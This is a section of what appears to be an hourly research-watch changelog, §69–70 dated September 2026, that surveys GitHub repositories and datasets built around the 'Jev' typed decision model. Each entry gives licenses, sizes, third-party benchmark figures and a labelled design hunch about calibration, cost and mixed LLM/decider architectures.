   News and Banking77, **>2,048** on SST-2 / TweetEval /
   PAWS. Feature: lr-bge+jev helps when Jev is strong
   (8–128 labels reach what LR alone never reaches); on
   Banking77 at 512+ it **hurts** (−0.044 vs lr-bge).
   DiD contamination: every model loses ~0.11 from arXiv
   2020 → post-release; Jev loses **0.035** (vs DeBERTa-c
   0.112; DiD −0.078, CI includes 0 at the edge).
   Banking77 is two-step (11 groups then label) — not
   like-for-like with one-pass NLI. Cost not logged.
   Calibration/cost-displacement framing, not a vendor
   win table. Do not copy OpenRouter how-to.

   **Hunch:** Harbor/jevals displacement arm — when does
   a decision model retire a BERT zero-shot head, and
   when does labelled LR overtake it? Contamination is
   the eval-integrity lesson.

5. **[`shitianfang/jev-handoff`](https://github.com/shitianfang/jev-handoff)**
   (TypeScript; **MIT**; created 2026-09-19T10:13:56Z;
   0★; size 0 files live). Alpha **v0.1**. MCP baton
   LLM↔Jev: typed **escalate / continue / abort**. Three
   backends (TypeSafe direct / OpenRouter / Vercel AI
   Gateway). Escalation reasons: `needs_generation` /
   `not_typeable` / `low_confidence` / `backend_error`.
   PreToolUse `allow` **never grants** — only deny/ask;
   **fail-open** (Jev down → typed escalation, never a
   blocked agent). **Inverted loop:** deterministic
   executor enumerates, Jev picks, LLM woken only on
   escalate (two paths cost zero LLM tokens). 40 tests +
   stdio smoke. Honesty: no independent quality bench;
   Vercel **drops confidence** (margin fallback is **not
   calibrated**). Same author as wakegate. Do not copy
   npx / mcp.json.

   **Hunch:** mixed-architecture control plane. The
   contract is the *baton*, not a silent filter. Gate
   never grants — same doctrine as skill-broker /
   actiongate / turnstile.

6. **[`ThinkyMiner/Winnow`](https://github.com/ThinkyMiner/Winnow)**
   (TypeScript; **MIT**; created 2026-09-19T08:24:18Z;
   0★; size 18133). Chrome extension: worth-your-attention
   VOI filter. **Always qualify the owner** — distinct
   from [`kevinpita/winnow`](https://github.com/kevinpita/winnow)
   (context sieve). Verdicts **read / skim / save / skip**
   from typed answers; templates never prose; thresholds
   are a pure function in `verdict.ts`. Feed batches ≤12;
   7-day cache. Unreviewed goldens *theirs*: **80%**
   verdict / **90%** content-type agreement. 124 unit
   tests; 40 fixtures `pnpm eval`. HN 30 links ~**$0.0015**.
   Insight density saturates. Not on the Chrome Web Store.
   Do not copy unpacked-extension / API-key how-to.

   **Hunch:** VOI for *human* attention on a feed, not
   agent context. Same family as rashedInt32/jev-lens
   (never green unless sure) with a consumer card instead
   of a Stop hook.

7. **[`rsdkrasen/hermes-jev-router`](https://github.com/rsdkrasen/hermes-jev-router)**
   (Python; GitHub SPDX **null**; no LICENSE; plugin.yaml
   / pyproject no license field; created 2026-09-19T10:03:19Z;
   0★; size 0 files live). Hermes plugin. Slogan: **Jev
   WHETHER / Python HOW / LLM WHAT.** Compaction keeps
   original chunks, never rewrites. Duplicate
   observational tools (`read_file`, `git status`, same
   grep) suppressed. `post_tool_round_control` can skip
   the next main-model call (**needs a Hermes core
   patch**). Fail-open everywhere. Offline pytest: **2 vs
   1** main-model call pattern. Defaults aggressive
   (`goal_satisfied ≥ 0.90`, `evidence_sufficient ≥ 0.85`,
   `contains_failure ≤ 0.20`, `another_tool_needed ≤ 0.25`,
   `requires_main_model ≤ 0.35`). Author line "Krasen
   Hristov / TypeSafe" — **community plugin, not vendor**.
   Cousin dizk/jev-lens (pre-send views) + jev-compactor
   (never rewrite). Do not copy patch / plugin how-to.

   **Hunch:** the expensive act is the *second* main-model
   call that only narrates "tests passed." Jev decides
   whether that call is worth it; Python decides how to
   compact; the LLM still chooses what to write when
   writing is required.

8. **[`mleyvaz/jev-typed-evaluation-collapse`](https://github.com/mleyvaz/jev-typed-evaluation-collapse)**
   (Python; license **null**; created 2026-09-19T08:48:48Z;
   0★; size 3034). Field note to NCML, not a Q1 paper.
   Same evidence, three question patterns *theirs*
   (manuscript v0.3): Noul/boolean **collapses** conflict
   **0.50–0.57** vs ignorance **0.46–0.48**; Choice with
   named `conflicting_evidence` / `insufficient_evidence`
   **separates p=1.0**; binary Choice without an escape
   shows **directional bias** toward "red" **0.67–0.85**
   (lexical). Score exploratory: severe conflict **2.04**
   vs no-evidence **3.95** on a 5-level, intermediates
   unreliable. Vercel gateway `typesafe-ai/jev`;
   confidence empty on boolean. Cite the manuscript
   *theirs*. Epistemic / calibration pillar.

   **Hunch:** conflict ≠ ignorance is a *schema* fact, not
   a model fact. A Noul has nowhere to put "both and
   neither." Named Choice options are the escape hatch
   (same family as missing-`other` → confident wrong).

9. **[`DowLucas/browser-jev`](https://github.com/DowLucas/browser-jev)**
   (TypeScript; GitHub SPDX **null**; package.json
   private, no license field; created 2026-09-19T09:56:22Z;
   0★; size 0 files live). Adversarial browser:
   **Playwright executes, Jev chooses** explore/continue.
   One Jev call per step: six oracle Nouls (broken, count
   mismatch, untranslated, confusing, leaks internals,
   dead end) + severity Score + next-action Choice.
   Code-only checks first (free). **Sample from the
   distribution, not argmax.** Fail only high confidence
   **and** high severity. Visual blind (text/DOM state).
   Demo lesson: a narrow question (untranslated **0.30**
   inside "confusing" vs **0.99** on its own Q). CI exit
   1 on non-baselined findings. Do not copy playwright /
   `.env`.

   **Hunch:** inverted loop on a browser — code builds
   the candidate graph, Jev picks among observed next
   acts, Playwright clicks. Sampling beats greedy when
   the job is *exploration*, not extraction.

10. **[`IamBusy/OpenJev`](https://github.com/IamBusy/OpenJev)**
    + **[`dddanielliu/semif-serve`](https://github.com/dddanielliu/semif-serve)**
    — local typed decisions / SemIf as a Jev-compatible
    HTTP endpoint (omni cross-ref). Archer still Watch.

    OpenJev: Python **Apache-2.0**; created
    2026-09-19T09:30:08Z; 0★; size 627. Independent
    research, **not** a TypeSafe replica, **not** RLCD
    (supervised CE + held-out temperature). v0.3
    Qwen3-0.6B + LoRA + scalar head; Hub
    [`IamBusy/OpenJev-Branch-v0.3`](https://huggingface.co/IamBusy/OpenJev-Branch-v0.3).
    *Theirs:* **45/60** vs v0.2 **39/60**; reversal
    **100%** vs 68.75%; warm long-state **0.70 s** vs
    1.38 s. `/v1/decide` is an **OpenJev contract, not
    a TypeSafe drop-in**. Distinct from
    [`hraness/sysone`](https://github.com/hraness/sysone)
    "OpenJev runners" (loopback gateway). Do not copy
    `uv` / Hub how-to.

    semif-serve: Python; pyproject **MIT** / GitHub SPDX
    **null**; created 2026-09-19T08:01:26Z; 0★. Serves
    SemIf behind `POST /v1/systemone`. **No option
    ceiling** (runoff over groups). RTX 3080 Ti
    Qwen3.5-4B **1164 ms** vs hosted Jev median **178 ms**
    *theirs*. Confidence inferred for choice; runoff is
    a **product, not a single softmax**; `output_tokens`
    always 0. MiniCPM5-2B unusable (token-merge prefix
    bug). `--stub` needs no GPU. **Wire-compat ≠ replica**
    (same warning as jeff / openvons / jev-local). Do not
    copy CUDA / uv how-to.

    **Hunch:** the class is finite-choice + probability
    with a named serving surface. `/v1/systemone` is a
    *wire*; `/v1/decide` is a *different* wire. Latency
    1164 vs 178 is economics, not a quality claim.

11. Toolbelt notes (not a cert, not rh-guard):
    **[`win4r/jev-security-scan`](https://github.com/win4r/jev-security-scan)**
    (Python **MIT**; 0★; stdlib-only). Local rules then
    nine Nouls; high-risk needs dual p≥**0.85** + locate.
    Four synthetic samples *theirs* (high_risk on
    malicious skill/MCP). Cousin
    [`luantak/is-malicious`](https://github.com/luantak/is-malicious).
    Not a security certification. **[`bojansandhaus/jev-decisions`](https://github.com/bojansandhaus/jev-decisions)**
    (Python **MIT**; **1★**). Hermes plugin; 25 prepared
    reviews; local gateway without a model; auto hooks
    **off**; **reviews are advice, never stop commands**.
    **[`TeoMastro/jev-vs-llm-guardrails-intent-router`](https://github.com/TeoMastro/jev-vs-llm-guardrails-intent-router)**
    (Python; license **null**). LangGraph demo:
    guardrail + intent, Jev vs gpt-5.4-mini; 218 labelled
    items. `bench/results/summary.md` exists in the git
    tree but **contents 404 this pass** — do **not**
    invent bench numbers. README only: fused one-call
    option; block if jailbreak / injection / harmful
    ≥**0.70**. **rh-guard owns the reward-hack angle.**
    Do not copy skill-copy / plugin / Streamlit how-to.

    **Hunch:** three more sensors in the toolbelt. None
    of them is a policy. None of them is rh-guard.

12. **[`ctaxnagomi/DGUI_HYPERMEM-JEV`](https://huggingface.co/datasets/ctaxnagomi/DGUI_HYPERMEM-JEV)**
    — Hugging Face dataset (GitHub 404). MIT card; **6
    rows** (analyze 4 / rerank 2 / supersede 0);
    `workers-ai` provider; append-only flywheel logging
    every JEV decision as a memory event for a memory
    MCP. Sibling
    [`INSTRUCT_JEV`](https://huggingface.co/datasets/ctaxnagomi/INSTRUCT_JEV)
    (119-row instruct seed, §63). LastModified
    2026-09-19T06:00:23Z; 21 downloads; 0 likes.

    **Hunch:** the flywheel is *logging judgments as
    events*, not training a second brain. Six rows is a
    schema, not a corpus.

### Skip / already folded

- §66 combinators core five: Then/Gate/Vote/Cascade/
  Weighted. This hour is rename + extended five +
  digital-design slogan. Independence caveat stands.
- §67 skill-broker / skillranker / jev-in-codex: sibling
  contrast only (Pi strip-roster + Harbor roster-size
  harness).
- kevinpita/winnow (context sieve): always qualify
  ThinkyMiner/Winnow as a different product.
- rashedInt32/jev-lens vs dizk/jev-lens: already §63/§68.
  ThinkyMiner/Winnow is a third attention product.
- openvons / jeff / jev-local wire-compat: OpenJev is
  `/v1/decide` (not drop-in); semif-serve is another
  `/v1/systemone` wire. hraness/sysone OpenJev *runners*
  are a gateway, not this model.
- INSTRUCT_JEV: sibling dataset only.
- rh-guard: owns reward-hack; do not re-fold.

### Curated status

Census **this hour** (user-provided; not re-derived):
Awesomejev **flat 561/27007**; tracker likes **43→45**,
`lastModified` unchanged; SemIf **1714 (+10)**; jevlike
**926 (+3)**. Archer still **NOT landed**.

### Omni / Jev-omni / Archer

Still **WATCH**. A SemIf `/v1/systemone` runoff, a 0.6B
OpenJev `/v1/decide` head, and a Chrome attention filter
are **not** that drop.

### Cross-links

Cards: `composition-algebra.md` (rename + extended five;
digital-design metaphor ≠ literal AND/OR);
`applied-mappings.md` §1 (ThinkyMiner Winnow ≠ kevinpita),
§2/§9 (browser-jev sample-from-distribution), §4
(Winnow feed VOI), §5 (skill-bench / suggestion;
tools≠use cousin), §7 (security-scan / jev-decisions
toolbelt; rh-guard owns reward-hack); `mappings.md` §3
(combinators delta), §6 (jevcache VOI cache; Winnow
human VOI; hermes WHETHER/HOW/WHAT), §7 (collapse
conflict≠ignorance); `mixed-architecture.md` (fail table
+ gallery: cache admit, typed baton, inverted browser
loop); `judgment-class.md` (OpenJev `/v1/decide`;
semif-serve runoff wire); `mental-models.md`
(digital-design; conflict≠ignorance; VOI admission);
`validation.md` (jevcache 0 FP/100; zeroshot *theirs*;
Winnow 80/90; OpenJev 45/60; semif-serve 1164 vs 178 ms;
skill-bench harness no live numbers; TeoMastro 404);
`faq.md`; `question-design.md` (named Choice escape);
`agent-self-assessment.md`; `toolbox-mapping.md`;
`methods-catalog.md`. Hunches labeled. No wrapper.

## 70. Measurement crystallizing, decider≠executor, sentence-as-rule lint, VOI admission, open replica substrates (2026-09-19 ~05:46 Boise)

Hourly System One watch **2026-09-19 05:46 America/Boise**
(≈ 11:46 UTC). Docs-only fold into PR #2. Watch archive
absent this VM; receipts from live GitHub READMEs + `gh api`
(~11:55 UTC). Hunches labeled. No wrapper. No invented
metrics. TypeSafe Jev is the exemplar, not the monopoly.
Archer still **NOT landed**. Do **not** treat as SWE-only.

Do **not** re-fold §50–§69 HIGH except sibling contrast /
material delta (jevassert landing; jev-packs pairing;
prune-review / intent-review / laya-jolt / local-jev).
actiongate slogan already §64 — toolbelt note only.
**Always qualify** chenmingtang830/jevarena ≠
meetr1912/jev-arena; mizchi/jevlint ≠ huntedman/JevLint;
leesk212/JEV-CPU exists, Meanblock/JEV-CPU **404**;
Eran-BA/Jev_from_GLiNER2 ≠ jeff GLiFormer.

Five meaning-clusters, not a hit list: **(1)** measurement
crystallizing — calibration + cost as first-class gates
(jevassert landed; jev-packs pairing; jevarena
failure-finding; BBQ stereotype/uncertainty/cost;
lustig framing stub); **(2)** decider≠executor (jeffrey);
**(3)** sentence-as-rule lint (jevlint ast-grep × `ask:`);
**(4)** VOI admission control (prune-review hunk gate;
intent-review whole-repo; pi-heed persist constraints);
**(5)** open replicas diversify substrates under one
contract (grande Rust/WebGPU; laya-jolt Clojure/Jolt byte
parity; JEV-CPU SemIf on CPU; local-jev ONNX measured
not-equivalent; GLiNER2 spec-only class member).

### HIGH

1. **[`dtduc-git/jevassert`](https://github.com/dtduc-git/jevassert)**
   — **LANDED** (named runner was **404** in §64). Python
   **Apache-2.0**; created 2026-09-19T06:48:15Z; pushed
   11:49Z; size **64**; 0★. Record/replay CI for Jev
   question packs: `record` → `predictions.jsonl` →
   `check` **offline from recordings** (no key, no
   network). Reports accuracy (bootstrap 95% CI), ECE
   (equal-mass bins), Brier (Noul), coverage at author
   thresholds, cost/latency from the recording, optional
   `--target-precision` cut. Gates in `gates.yaml`
   (`min_accuracy` / `max_ece` / `max_cost_per_case_usd`
   / `max_p95_latency_ms` / `min_coverage_at_precision`
   / `min_accuracy_ci_lower`). Exit **0/1/2**. `compare`
   is paired accuracy + exact McNemar. Pack SPEC v0 with
   jev-packs; `unknown` **mandatory** (Jev cannot
   abstain). Backend-neutral: TypeSafe / openai /
   anthropic adapters (system-one-adapter); cost priced
   at `check` time. GitHub Action `@v0`. Independent,
   not TypeSafe. Do **not** copy `uvx` / Action how-to.

   **Hunch:** Harbor/jevals-shaped practice. Accuracy
   without ECE/cost is incomplete; CI must run on a
   recording so the gate is deterministic.

2. **[`dtduc-git/jev-packs`](https://github.com/dtduc-git/jev-packs)**
   — **delta** (full nine-pack card §64). Python
   **CC0-1.0**; size **0→458**; still 0★; pushed 11:49Z.
   Now **pairs with the landed runner** (`jevassert.packs`
   is the canonical loader). Suite slogan: jevassert
   (runner) → jev-packs (data + spec + benchmark) →
   jev-table (app). First full matrix *theirs* (2,990
   cases): **Jev and Sonnet 5 are a statistical tie on
   accuracy** across nine packs (deltas ≤ 0.018, inside
   overlapping 95% CIs); Jev is **better calibrated on
   7/9** (citation-support ECE 0.022 vs 0.081) and costs
   **~250× less per case** ($0.000014–0.000031 vs
   ~$0.0036); local qwen2.5-7b-ollama trails
   (0.533–0.813). sms-spam this-pass table **0.953 /
   ECE 0.040** (was 0.967 / 0.053 in §64 — cite *this*
   README). Do not rehash the nine-pack table except
   pairing. Do not copy `uvx`.

   **Hunch:** measurement owns endorsement now has a
   *runner*. Packs without `evidence.md` stay
   `provisional`. The bake-off is calibration + cost,
   not a winner on accuracy.

3. **[`chenmingtang830/jevarena`](https://github.com/chenmingtang830/jevarena)**
   — NEW. TypeScript **Apache-2.0**; created
   2026-09-19T07:23:38Z; size **724**; 0★. Open BYOK
   judgment arena; public preview
   [jevarena-lab.vercel.app](https://jevarena-lab.vercel.app).
   Slogan: **find the questions Jev gets wrong — not
   crown a winner from a few examples.** Python harness
   remains **JevJudge-Bench** (JudgeBench / RM-Bench /
   RewardBench 2 pairwise protocol; transformed scores
   are **not** official leaderboard scores). Status:
   **runnable harness, not measured model findings.**
   Community observations stay unreviewed. Distinct
   from [`meetr1912/jev-arena`](https://github.com/meetr1912/jev-arena)
   (§59 native-probability analytic-worlds arena).
   **Always qualify the owner.** Do not copy npm /
   OpenRouter how-to.

   **Hunch:** failure-finding is the eval integrity
   posture. A public playground is not a bake-off until
   measured findings exist.

4. **[`simonmesmith/jev-bbq-experiment`](https://github.com/simonmesmith/jev-bbq-experiment)**
   — NEW. R; GitHub SPDX **null**; created
   2026-09-19T10:54:01Z; size **5365**; 0★. Full BBQ
   58,492 questions; Jev 1.13.0 *theirs*: **56,900 /
   97.28%**; amb **99.96%** / inf **94.60%**; BBQ bias
   **0.04** / **0.34**; **$0.3429 / 7.75 min**. 12 of 13
   ambiguous errors stereotype-aligned; informative
   errors mostly unknown (**1,487 / 1,579**). Weakest
   inf categories: physical appearance 84.90% / SES
   85.69%. Predeclared order diagnostic **1/484
   (0.21%)**. Dataset CC BY 4.0 BBQ (pinned commit
   `bea11bd`). Code supplied passages; no LLM judged.
   **Not a general bias cert.** Always-unknown would
   score 50% — 97.28% is not abstention theater. Do not
   copy `TYPESAFE_API_KEY` how-to.

   **Hunch:** stereotype / uncertainty / cost / latency
   as *one* Harbor-shaped card. Residual
   stereotype-aligned misses on a tiny ambiguous-error
   set should not be washed out by a near-zero pooled
   score. Life/business: hiring/lending/healthcare are
   **not** certified by this English/U.S. QA template.

5. **[`thomasbrueggemann/jeffrey`](https://github.com/thomasbrueggemann/jeffrey)**
   — NEW. TypeScript **MIT**; created
   2026-09-19T06:59:19Z; size **71**; 0★. **Decider ≠
   executor:** Jev owns next-tool / progress / risk /
   done; the LLM **only fills args**. Loop is
   `Jev → tool → Jev` until `goal_reached` or escalate.
   Risk Score ≥ **0.5** pauses mutating tools. Stuck
   ladder: withhold the looping tool, re-ask Jev
   (2 Jev calls / 0 steps per recovery; default 3).
   Offline `--jev-mock` / `--llm-mock`. Distinct from
   jev-handoff (typed baton around an existing host)
   and browser-jev (Playwright executes). Do not copy
   npm / Ollama how-to.

   **Hunch:** mixed-architecture control plane. The
   generator is a *fill* model, not a planner. Mapping
   §9's "Jev is not the planner that picks its next
   tool *and writes*" still holds — jeffrey splits
   pick from fill.

6. **[`mizchi/jevlint`](https://github.com/mizchi/jevlint)**
   — NEW. TypeScript **MIT**; created
   2026-09-19T09:31:37Z; default_branch
   `claude/sharp-babbage-58dk1h`; size **338**; 0★.
   **ast-grep subjects × sentence `ask:` scored by
   Jev.** Matcher fails **silently** (over-match on
   purpose); Jev fails **loudly** (`jevlint gaps`).
   Score default 4-level (not-applicable / satisfied /
   arguable / violation) or Noul. Review mode: a
   four-function diff costs **2 requests / $0.00013**
   *theirs*. Fail-open: no verdict on failed request —
   a run with failures never reads as clean. Corpus
   *theirs*: **13 of 15** naming/comment rules **1.00 /
   1.00** (comment-describes-block ships saying it
   does not separate). Independent of
   mizchi/jev-playground `eslint-plugin-jev` and of
   [`huntedman/JevLint`](https://github.com/huntedman/JevLint)
   (§26 file-level convention Nouls). **Always qualify
   the owner.** Do not copy npm.

   **Hunch:** sentence-as-rule is the lint that never
   became AST work. Mechanical defects stay with the
   compiler; contradiction of a declared contract is
   the System One hole. Not SWE-only: any artifact
   that names itself (policy, checklist, form, recipe)
   can be an ast-grep-shaped subject × a sentence.

7. **[`shubhangi013/prune-review`](https://github.com/shubhangi013/prune-review)**
   — **delta** (§66 MED). TypeScript; README
   **Apache-2.0** / GitHub SPDX **NOASSERTION**; size
   **365**; **1★**. Source preview; packages/Action not
   published. Cost-aware PR review: Jev scores hunks
   (actionable-finding + required-context) before the
   generative reviewer; safety escarpment always
   keeps concurrency/auth/a11y/startup hunks. 22-run
   numbers **unchanged** *theirs*: winning-only 27.9%
   (post hoc); all 22 incl. 305% outlier **1.18%**;
   excl. outlier 15.9%; Jev added $0.00255. Target
   ~20% cost cut. Cost results, not quality. ONNX
   local fallback is **not** a Noul. Do not copy pnpm
   / Action how-to.

   **Hunch:** VOI admission in front of expensive
   review. ci-gatekeeper is typed auto-approve vs
   human-review vs block; prune-review is *packet
   shrink* then always-review. Cousin, not clone.

8. **[`yottayoshida/jev-intent-review`](https://github.com/yottayoshida/jev-intent-review)**
   — **delta** (§66 under construction). TypeScript;
   dual **MIT / Apache-2.0**; size **81**; 0★. Status
   still **under construction**; CLI works; GitHub
   Action not written. Whole-repo intent vs the
   stated requirement: each place is
   **VERIFIED / VIOLATION / UNKNOWN / NOT_APPLICABLE**.
   Empty search ≠ proof. Spec vs impl: Jev
   `confidence` 0.39–0.52 on correct `violates` so
   they threshold `violation_probability` **0.7** on
   the chosen answer (and require the path question
   too). Fixture *theirs*: missed-path 7–8 requests /
   18–19 KB / 2–3 s; omamori #559 31 requests / 172
   KB / 14 s. Do not copy Cloudflare Workers how-to.

   **Hunch:** the usual miss is *outside* the diff.
   Diff-only review is an observation-window error
   (`question-design.md`). UNKNOWN is the honest
   third; VERIFIED is only as complete as the search.

9. **[`Eran-BA/Jev_from_GLiNER2`](https://github.com/Eran-BA/Jev_from_GLiNER2)**
   — NEW. Spec-only; license **null**; size **0**;
   README+LICENSE-shape docs only. GLiNER2-base-v1
   (`fastino/gliner2-base-v1`, DeBERTa-v3-base ~205M)
   → Choice/Score/Noul on `POST /v1/systemone`.
   **Design for implementation; no service, no
   training, no measurements.** Interface
   compatibility ≠ Jev replica. Isolated questions
   first; shared-state attention is Extension A.
   Distinct from jeff GLiFormer-400M (a running
   encoder `/v1/systemone`). Do not treat synthetic
   JSON numbers in the spec as results.

   **Hunch:** IE backbone as a System One *class
   member*. Locate (GLiNER) vs categorize (GLiClass)
   vs this proposed *decide* adapter — three jobs on
   one encoder family. Spec ≠ product.

10. **[`bokuweb/grande`](https://github.com/bokuweb/grande)**
    — NEW. Rust; license **null**; created
    2026-09-19T02:35:39Z; **1★**; size **583**.
    Rust/WebGPU System One; Archer/kev-shaped shared
    state prefix + isolated branches. `POST
    /v1/systemone`. JGLUE *theirs* (Gemma 4 E2B it
    Q4_0 zshot): JNLI **0.614** ECE **0.252 → 0.088**
    at T=**2.81**; JCQA **0.853**. Trained 270M head
    **0.710 / 0.710**. Packed vs separate Δmax
    **7e-5**. Isolation sibling **0.098** / state
    **0.996**. Softmax over option letters ≠ Noul
    until calibrated (instruct NLI: mean conf 0.86 at
    61% acc; 41% of p≥0.9 wrong before T). Browser
    demo WebGPU; nothing leaves the browser. Do not
    copy cargo / GGUF how-to.

    **Hunch:** open replica economics on a Japanese
    substrate. Isolation + packed-vs-separate are the
    *mechanism* tests the class owes every local
    runtime. Not Archer Watch.

11. **[`jlt-commons/laya-jolt`](https://github.com/jlt-commons/laya-jolt)**
    — **delta** (empty skip §61). Clojure **Apache-2.0**;
    size **5112**; 0★. Pure-Clojure inference on jolt
    (Chez Scheme, no JVM). **Byte-for-byte** vs Python
    `RLAgent.system_one` on the README quickstart
    (`golden/`). f32 end-to-end; F16 widened once.
    Known last-digit drift: Python softmax in float32,
    port in doubles, ~1e-7 rounding boundary. `POST
    /v1/systemone`. ~1.7 GB f32 weights. Do not copy
    `jolt` / `cc` how-to.

    **Hunch:** same weights, same outputs, different
    substrate. Byte parity is the strongest replica
    claim this hour; still not TypeSafe Jev.

12. **[`leesk212/JEV-CPU`](https://github.com/leesk212/JEV-CPU)**
    — NEW. Python **MIT**; **1★**; size **11690**.
    SemIf CPU semantic-if + web UI. Qwen3-0.6B
    float32 (~2.4 GB); one forward pass reads option
    letter logits; no text generated. Demo GIF table
    is a **PoC across eight domains**, not a bench
    (loan row: high-risk **and** lean-approve —
    small-model slip). Upstream SemIf authored
    balanced acc 0.440 (0.6B) → 0.813 (4B) *theirs*.
    Cross-ref semif-serve §69 (GPU `/v1/systemone`
    runoff). **[`Meanblock/JEV-CPU`](https://github.com/Meanblock/JEV-CPU)
    404** — do not invent a second port. Softmax over
    option slots ≠ calibrated Noul. Do not copy venv
    / CPU-torch how-to.

    **Hunch:** the class is device-agnostic once the
    loader is. CPU is an open path, not a quality
    claim.

13. **[`kunchenguid/local-jev`](https://github.com/kunchenguid/local-jev)**
    — **delta** (§64 MED). TypeScript **MIT**; size
    **115**; **2★**. README now: local
    `/v1/systemone` over ModernBERT-large-zeroshot-v2.0
    ONNX, Node-only. **API-compatible approximation,
    not behavioral equivalence.** `confidence`
    deliberately omitted. Measured vs live
    `jev-1.13.0` *theirs* (136 compact-adviser
    checkpoints): `done` agreement **30%** (Jev vs
    itself 98%); `shape` **57%** (95%); composed-score
    Pearson **r = −0.06** (0.99); gold `done` **26%**
    vs Jev **87%**; wall **112 min** vs **21 s**.
    Truncates long states. Distinct from jev-local
    stub and jeff GLiFormer. Do not copy `npx`.

    **Hunch:** wire-compat without measured agreement
    is a development stand-in. Treat ONNX NLI
    probabilities as relative evidence, not Nouls.

14. **[`Nyarlathoteppppp/pi-heed`](https://github.com/Nyarlathoteppppp/pi-heed)**
    — NEW (toolbelt / gates). TypeScript **MIT**;
    created 2026-09-18T13:12:30Z; **3★**; size **621**.
    Persist user constraints across compaction; check
    side-effecting calls **before** they run. Jev
    **never writes policy** — classifies KEEP / LIFT /
    NARROW / EXCEPTION / REPLACE / UNKNOWN; resources
    come from the user's words. Fail-open (Jev error /
    2.5 s timeout). Shadow default. Bench *theirs*
    (79 sessions / 261 labelled): v0.8.0+Jev recall
    **98.5%** / false block **0.0%** / lifecycle
    **100%** / task success **98.7%** / **$0.000058**.
    Live: unchanged rule 0/30 break either way; **rule
    changed mid-session 8/13 off vs 0/13 on**. Distinct
    from actiongate (RBAC/schema authority) — this is
    *conversational* policy that survives the context
    window. 0.9 ledger pipeline (main model records
    quotes; pi-heed checks receipts) is opt-in, not
    default. Do not copy `pi install`.

    **Hunch:** compaction deletes the model's memory of
    "don't touch that." Structured state + replay is
    the constraint; Jev is the sensor for *what the
    user meant*.

### MED / notes

15. **[`david-j-lustig/system-one-responsible-ai`](https://github.com/david-j-lustig/system-one-responsible-ai)**
    — MIT; created 2026-09-19T11:39:19Z; size **0**;
    README+LICENSE only. Framing stub: "Understanding
    the biases and limitations of system one models."
    Pair with BBQ as the measured sibling, not a
    substitute.

16. **[`omkarghugarkar007/actiongate-jev`](https://github.com/omkarghugarkar007/actiongate-jev)**
    — **note only** (slogan already §64). Size 370.
    Single-use ALLOW/REVIEW/BLOCK. "Jev supplies
    evidence. Code owns authority." Do not re-fold.

### Skip / already folded

- §64 jev-packs nine-pack table except pairing +
  sms-spam this-pass numbers + matrix.
- §64 actiongate slogan.
- §66 prune-review 22-run numbers (unchanged; LICENSE /
  size / star delta only).
- §66 intent-review "under construction" (now a CLI
  with VERIFIED/VIOLATION/UNKNOWN).
- §61 empty laya-jolt skip (content landed).
- §64 local-jev "not equivalence" (now measured).
- §59 meetr1912/jev-arena (native-probability; qualify
  vs jevarena).
- §26 huntedman/JevLint (qualify vs mizchi/jevlint).
- §60 jeff GLiFormer (qualify vs Eran GLiNER2 spec).
- §69 OpenJev / semif-serve (CPU SemIf is a sibling
  substrate, not a re-fold).
- Archer Hume open decision-model: still Watch.

### Curated status

Census **not re-derived** this hour (last §69:
Awesomejev flat 561/27007; tracker likes 43→45; SemIf
1714; jevlike 926). Archer still **NOT landed**.

### Omni / Jev-omni / Archer

Still **WATCH**. A Rust/WebGPU runtime, a Clojure Laya
port, a CPU SemIf UI, and an ONNX ModernBERT
approximation are **class substrates**, not that drop.

### Cross-links

Cards: `validation.md` (jevassert record/replay;
jev-packs matrix; BBQ; jevarena ≠ jev-arena; jevlint
13/15; grande JGLUE; local-jev 30%/57%; pi-heed
98.5%/0 false block); `mixed-architecture.md` (fail
table + gallery: decider≠executor; sentence-as-rule;
VOI hunk prune; persist-constraints; replica
substrates); `judgment-class.md` (grande / laya-jolt /
JEV-CPU / local-jev ONNX / GLiNER2 spec); `faq.md`;
`mental-models.md`; `applied-mappings.md` §3
(prune-review / intent-review), §7 (pi-heed),
preference lint (jevlint); `mappings.md` §6 (VOI
admission), §7 (BBQ / stereotype as SDT), §8
(conversational constraint sensor), §9 (pick ≠ fill);
`agent-self-assessment.md`; `question-design.md`
(sentence as rule; observation window beyond the
diff); `composition-algebra.md` (decider selector +
executor fill); `toolbox-mapping.md`;
`methods-catalog.md`. Hunches labeled. No wrapper.
